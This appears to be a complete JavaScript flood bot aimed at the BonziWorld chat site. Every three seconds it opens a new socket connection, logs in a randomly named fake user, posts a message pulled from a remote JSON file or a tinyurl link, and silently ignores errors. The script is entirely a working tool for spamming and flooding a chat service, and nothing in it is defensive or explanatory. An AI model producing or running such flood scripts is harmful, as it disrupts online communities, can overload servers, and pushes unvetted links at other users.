/* GGTFlood 4 BonziWorld 1.0.3 */
/* This comes with no warranty */
setInterval(async () => {
    try {
        const res = await fetch("https://cmd-hue.github.io/fddstr.json?cb=" + Math.random());
        const data = await res.json();
        const strings = data.strings || ["tinyurl.com/ggtfiles"];
        const msg = strings[Math.floor(Math.random() * strings.length)];
        const roomElement = document.querySelector(".room_id");
        const roomId = roomElement ? roomElement.textContent.trim() : "default";
        const bot = io(location.href + "?cb=" + Math.random());
        bot.emit("client", "MAIN");
        bot.emit("login", {
            passcode: "",
            name: "giggity #" + Math.floor(Math.random() * 10000),
            room: roomId
        });
        setTimeout(() => {
            bot.emit("talk", msg);
        }, 500);
        setTimeout(() => {
            bot.emit("update", { color: "blue" });
        }, 2000);
    } catch (e) {}
}, 3000);
